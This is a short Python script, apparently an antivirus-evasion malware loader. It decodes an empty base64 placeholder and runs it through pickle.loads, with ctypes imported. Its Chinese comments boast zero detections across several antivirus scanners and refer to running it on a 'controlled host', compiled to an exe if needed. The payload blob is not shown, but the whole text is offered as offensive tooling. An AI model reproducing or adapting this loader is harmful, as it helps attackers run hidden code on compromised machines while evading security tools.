import base64,pickle,ctypes
# 火绒杀毒通过，微步在线，virustotal，virscan，全部0报毒，免杀率100%(测试时间2023年3月5日23:26:37)
# 如被控主机没有python环境，可将脚本编译成exe文件再执行
# 由序列化生成器生成的s1_b64填入下面数据中
s1_b64=b''
pickle.loads(base64.b64decode(s1_b64))
